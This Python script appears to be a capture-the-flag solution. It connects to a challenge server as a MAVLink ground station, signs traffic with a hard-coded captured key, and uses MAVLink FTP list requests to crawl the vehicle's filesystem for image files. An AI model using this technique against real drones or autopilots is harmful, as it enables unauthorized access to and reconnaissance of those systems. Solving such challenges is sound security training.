#!/usr/bin/env python3

import os
import struct
import time
from collections import deque

os.environ["MAVLINK20"] = "1"

from pymavlink import mavutil

HOST = "0.cloud.chals.io"
PORT = 15174

KEY = bytes.fromhex(
    "d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126"
)

TARGET_SYS = 1
TARGET_COMP = 1

LIST_OPCODE = 3


def make_list_packet(path, seq):
    hdr = struct.pack(
        "<HBBBBBBI",
        seq,
        0,
        LIST_OPCODE,
        len(path),
        0,
        0,
        0,
        0
    )

    return (hdr + path.encode()).ljust(251, b"\x00")


def ftp_list(m, path, seq):

    payload = make_list_packet(path, seq)

    m.mav.file_transfer_protocol_send(
        0,
        TARGET_SYS,
        TARGET_COMP,
        payload
    )

    while True:

        msg = m.recv_match(blocking=True, timeout=5)

        if msg is None:
            print("[!] timeout:", path)
            return []

        if msg.get_type() != "FILE_TRANSFER_PROTOCOL":
            continue

        raw = bytes(msg.payload)

        _, _, opcode, size, _, _, _, _ = struct.unpack(
            "<HBBBBBBI",
            raw[:12]
        )

        #
        # ACK
        #
        if opcode != 128:
            print("[!] FTP error", opcode, "path =", path)
            return []

        body = raw[12:12+size]

        out = []

        for e in body.split(b"\x00"):

            if not e:
                continue

            typ = chr(e[0])

            text = e[1:].decode(errors="ignore")

            #
            # filename\tfilesize
            #
            parts = text.split("\t")

            name = parts[0]

            size = None

            if len(parts) > 1:
                try:
                    size = int(parts[1])
                except:
                    pass

            out.append((typ, name, size))

        return out


print("[*] Connecting...")

m = mavutil.mavlink_connection(
    f"tcp:{HOST}:{PORT}",
    dialect="ardupilotmega",
    source_system=255,
    source_component=190,
)

m.setup_signing(
    KEY,
    sign_outgoing=True,
    allow_unsigned_callback=lambda mav, msgid: True,
)

m.mav.heartbeat_send(
    mavutil.mavlink.MAV_TYPE_GCS,
    mavutil.mavlink.MAV_AUTOPILOT_INVALID,
    0,
    0,
    0,
)

time.sleep(1)

visited = set()
queue = deque(["/"])

seq = 0

while queue:

    cur = queue.popleft()

    if cur in visited:
        continue

    visited.add(cur)

    print()
    print("==========")
    print("DIR:", "/" if cur == "" else cur)

    entries = ftp_list(m, cur, seq)

    seq += 1

    for typ, name, fsize in entries:

        if name in [".", ".."]:
            continue

        full = (cur.rstrip("/") + "/" + name) if cur else "/" + name

        if typ == "D":

            print("DIR:", cur)

            queue.append(full)

        elif typ == "F":

            if fsize is None:
                print("[FILE]", full)
            else:
                print(f"[FILE] {full} ({fsize} bytes)")

            ext = os.path.splitext(name)[1].lower()

            if ext in [".png", ".jpg", ".jpeg", ".bmp"]:

                print()
                print("########################################")
                print("FOUND IMAGE:", full)
                print("########################################")

